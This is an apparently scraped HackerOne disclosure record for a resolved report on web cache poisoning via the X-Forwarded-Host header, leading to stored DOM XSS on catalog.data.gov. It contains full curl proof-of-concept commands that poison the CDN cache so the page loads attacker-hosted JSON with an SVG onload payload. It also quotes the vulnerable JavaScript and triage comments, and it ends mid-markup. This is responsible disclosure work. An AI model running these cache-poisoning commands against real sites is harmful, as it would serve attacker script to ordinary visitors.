{"id":303730,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDM3MzA=","url":"https://hackerone.com/reports/303730","title":"Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-01-10T12:23:37.143Z","submitted_at":"2018-01-10T12:23:37.143Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"albinowax","url":"/albinowax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21499,"url":"https://hackerone.com/tts","handle":"tts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"TTS Bug Bounty","twitter_handle":"gsa_tts","website":"https://18f.gsa.gov","about":"The First Civilian Agency Public Bug Bounty Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-11-01T21:16:04.418Z","bug_reporter_agreed_on_going_public_at":"2018-10-22T08:25:26.812Z","team_member_agreed_on_going_public_at":"2018-11-01T21:16:04.340Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.\n\nThe root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the \u003cbody tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.\n\nThis behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. \n\nPlease be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:\n\n1. Run curl command to poison cache:\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \\\n    $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' \u003e /dev/null\n\n2. Visit the poisoned page:\nhttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\n\n3. Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)\n\nBehind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into \"Mostrar más \u003csvg onload=alert(document.domain)\u003e\"\n\nThis is the offending line of JavaScript:\nvar template_more = ['\u003ctr class=\"toggle-show toggle-show-more\"\u003e', '\u003ctd colspan=\"' + cols + '\"\u003e', '\u003csmall\u003e', '\u003ca href=\"#\" class=\"show-more\"\u003e' + this.i18n('show_more') + '\u003c/a\u003e', '\u003ca href=\"#\" class=\"show-less\"\u003e' + this.i18n('show_less') + '\u003c/a\u003e', '\u003c/small\u003e', '\u003c/td\u003e', '\u003c/tr\u003e'].join('\\n');\n\nTo mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. \n\nPlease let me know if you have any questions.\n\nCheers,\n\nJames \u0026 Gareth\n\n## Impact\n\nAn attacker can deface most pages on catalog.data.gov.","vulnerability_information_html":"\u003cp\u003eAn attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.\u003c/p\u003e\n\n\u003cp\u003eThe root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the \u0026#39;data-site-root\u0026#39; and \u0026#39;data-locale-root\u0026#39; attributes on the \u0026lt;body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.\u003c/p\u003e\n\n\u003cp\u003eThis behaviour is harmless by itself, since I can\u0026#39;t make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. \u003c/p\u003e\n\n\u003cp\u003ePlease be careful when exploring this issue, as it\u0026#39;s potentially quite easy to accidentally poison CloudFront\u0026#39;s cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eRun curl command to poison cache:\u003cbr\u003e\ncurl -i -s -k  -X $\u0026#39;GET\u0026#39; \\\u003cbr\u003e\n-H $\u0026#39;Host: catalog.data.gov\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Accept: \u003cem\u003e/\u003c/em\u003e\u0026#39; -H $\u0026#39;Accept-Language: en\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\u0026#39; -H $\u0026#39;x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?\u0026#39; -H $\u0026#39;Connection: close\u0026#39; \\\u003cbr\u003e\n$\u0026#39;\u003ca title=\"https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\" href=\"/redirect?url=https%3A%2F%2Fcatalog.data.gov%2Fdataset%2Fconsumer-complaint-database%3Fdontpoisoneveryone%3D6\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026#39; \u0026gt; /dev/null\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eVisit the poisoned page:\u003cbr\u003e\n\u003ca title=\"https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\" href=\"/redirect?url=https%3A%2F%2Fcatalog.data.gov%2Fdataset%2Fconsumer-complaint-database%3Fdontpoisoneveryone%3D6\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWait for a few seconds, and observe the popup caused by our injected alert(document.domain)\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eBehind the scenes, step 1 poisons the cache with a data-site-root value of \u0026#39;portswigger-labs.net/catalog.data.gov_json_xss/json.php\u0026#39;. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our \u0026#39;show more\u0026#39; JSON attribute to translate the \u0026#39;show more\u0026#39; text on \u003ca title=\"https://catalog.data.gov/dataset/consumer-complaint-database\" href=\"/redirect?url=https%3A%2F%2Fcatalog.data.gov%2Fdataset%2Fconsumer-complaint-database\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://catalog.data.gov/dataset/consumer-complaint-database\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e into \u0026quot;Mostrar más \u0026lt;svg onload=alert(document.domain)\u0026gt;\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eThis is the offending line of JavaScript:\u003cbr\u003e\nvar template_more = [\u0026#39;\u0026lt;tr class=\u0026quot;toggle-show toggle-show-more\u0026quot;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;td colspan=\u0026quot;\u0026#39; + cols + \u0026#39;\u0026quot;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;small\u0026gt;\u0026#39;, \u0026#39;\u0026lt;a href=\u0026quot;#\u0026quot; class=\u0026quot;show-more\u0026quot;\u0026gt;\u0026#39; + this.i18n(\u0026#39;show_more\u0026#39;) + \u0026#39;\u0026lt;/a\u0026gt;\u0026#39;, \u0026#39;\u0026lt;a href=\u0026quot;#\u0026quot; class=\u0026quot;show-less\u0026quot;\u0026gt;\u0026#39; + this.i18n(\u0026#39;show_less\u0026#39;) + \u0026#39;\u0026lt;/a\u0026gt;\u0026#39;, \u0026#39;\u0026lt;/small\u0026gt;\u0026#39;, \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;, \u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;].join(\u0026#39;\\n\u0026#39;);\u003c/p\u003e\n\n\u003cp\u003eTo mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. \u003c/p\u003e\n\n\u003cp\u003ePlease let me know if you have any questions.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003eJames \u0026amp; Gareth\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can deface most pages on catalog.data.gov.\u003c/p\u003e\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":252795,"file_name":"Screen_Shot_2018-01-10_at_12.11.01.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/252/795/d7c51591a6c2ad3957c229e1e37fe4764848d9e6/Screen_Shot_2018-01-10_at_12.11.01.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-10_at_12.11.01.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-10_at_12.11.01.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053000Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=0b1e10df224e9d77865fa838e5112d4168ed21f5cb77886204c1c0b2e4b2b172","file_size":249936,"type":"image/png"},{"id":252796,"file_name":"Screen_Shot_2018-01-10_at_12.13.45.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/252/796/b6b4478eac78315f6e0ead7aabeaa4bf1bcd9312/Screen_Shot_2018-01-10_at_12.13.45.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-10_at_12.13.45.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-10_at_12.13.45.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053000Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=cc79613af67c154df96da84e03b1d897c0dc27e27d735cb183e4900f36d317c8","file_size":263309,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":72,"voters":["badf00d","sp1d3rs","karma7","stefanofinding","albinowax","bl4de","spam404","mik317","sameerphad72","s_p_q_r","and 62 more..."],"severity":{"rating":"high","score":8.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"high","availability":"low"}},"structured_scope":{"databaseId":1013,"asset_type":"URL","asset_identifier":"https://catalog.data.gov","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2280240,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @albinowax, \n\nThank you for your submission! This looks interesting but I'm not able to reproduce with given steps, could you share any additional details if I need to follow?\n\nRegards.\n\n{F253348}","markdown_message":"\u003cp\u003eHi \u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! This looks interesting but I\u0026#39;m not able to reproduce with given steps, could you share any additional details if I need to follow?\u003c/p\u003e\n\n\u003cp\u003eRegards.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"req.PNG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/348/52d0d28c20c797f99e579e76e52942147a626deb/req.PNG?response-content-disposition=attachment%3B%20filename%3D%22req.PNG%22%3B%20filename%2A%3DUTF-8%27%27req.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053000Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026amp;X-Amz-Signature=7a255289ba1f28de97ae875e7f5702286519426c4bede2a0e1a5599dc23fdd47\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/348/52d0d28c20c797f99e579e76e52942147a626deb/req.PNG?response-content-disposition=attachment%3B%20filename%3D%22req.PNG%22%3B%20filename%2A%3DUTF-8%27%27req.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053000Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026amp;X-Amz-Signature=7a255289ba1f28de97ae875e7f5702286519426c4bede2a0e1a5599dc23fdd47\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-12T14:55:17.923Z","updated_at":"2018-01-12T14:55:17.923Z","actor":{"username":"chessmast3r","cleared":false,"url":"/chessmast3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":253348,"filename":"req.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/348/52d0d28c20c797f99e579e76e52942147a626deb/req.PNG?response-content-disposition=attachment%3B%20filename%3D%22req.PNG%22%3B%20filename%2A%3DUTF-8%27%27req.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2QYQVMVU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053000Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC3%2FsiyUovDMMRPwfmXSSMky3lQNd33wh1MrBmbWJC8HQIhAOSX92QvRr3Mllw0zHuI%2FUP9sF%2FDNWps6wYRKsfiEgbIKrQDCFEQARoMMDEzNjE5Mjc0ODQ5IgyayWzpgkc86ZJmRDMqkQNBHcx9TN8Qq3EOCDOHxZVSoo84ar5w931vjsPd%2BYQ3i%2Bx9eqo2ZtgVN1Jmoq8zs6hsL0mQ%2F20wJFKZixbR7HjPc8i4juMIQlnM8TPeS1SJgwLfpmO12sSyoWk3fn%2BevsZ74MOTjvipPhl7l4ysY7gvLSMb%2F%2FbZmlTb%2BRp9ew5nOoiXNI8oQZMkhOihsn1Q92Wzljmz7rLHf0SWhEVdMvtgNqYyJz%2FGfq5QgT7Ex9q0a8OeRuv2WivmkS0ItLzdLr4AZp8G9M8TS3hFKV7sBxW2jeQmBIgcwsfh6l5Kj2o1EeFByIjeAOeU8CtQvJjf1AYwsXig5iiWG1PDqO74ZMYim9a1AVJfIRMHELC9hgi%2BNRVkqsPBurY%2BhFIchB3A6MS0Fup9FcpwDiSPwMu92UsjrPwWcQSy7wF8W7uVHoWmYKo2Jie7uXX2WbkNvQn%2BVJkd%2ByJui6LuEsoOf46y4OUr9by1ZfOQEMvwaiEcDXAKt7msARgVRUaigRb1ZF8hYom2qPLbi%2BKKBIE%2FJ21mcK79gjDj36n%2FBTrqAbyLw6dOEWEdRc%2BQghV%2BGs0mxf6YcBEQ0xaDSLE5OQXQJX90aqhTYFzi15%2BtXM5rF%2FkTq%2FNonb0szkAGwKve9Fh2LyQ%2F7WBSh9XEjPVQ%2B94j5PqLLrVbqfO7RsbRpSefivNmepJrQv52y49fC1tTXoR893JVWe1bnDoXfPRtykz2CLE1WIUrJm7g0MwlQ4%2FYhjLC7FTb6WIejkEPZ0nJdYi90iaGNGoKuvlj2kpGsqCTPjBW8Vhu9R9qXAbPR%2Bj24hpsPhyGFzBe%2F1%2BqYcze%2B4BoEFO8hgcUAqm5L0zeqYMYIdqkfREAB0cTeQ%3D%3D\u0026X-Amz-Signature=7a255289ba1f28de97ae875e7f5702286519426c4bede2a0e1a5599dc23fdd47"}],"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2280342,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Which bit can't you replicate, the XFH header getting reflected, or the reflection getting stored in the cache?","markdown_message":"\u003cp\u003eWhich bit can\u0026#39;t you replicate, the XFH header getting reflected, or the reflection getting stored in the cache?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-12T16:04:26.214Z","updated_at":"2018-01-12T16:04:26.214Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2280374,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's an improved PoC that uses a timestamp to avoid caching issues:\n\n1. Execute the following command\n```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) \u0026\u0026 curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger \u0026\u0026 echo -e \"\\n\\n$url\"```\n\n2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome\n\n3. Wait a few seconds for the alert","markdown_message":"\u003cp\u003eHere\u0026#39;s an improved PoC that uses a timestamp to avoid caching issues:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eExecute the following command\u003cbr\u003e\n\u003ccode\u003eurl=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) \u0026amp;\u0026amp; curl -i -s -k -H $\u0026#39;Host: catalog.data.gov\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H 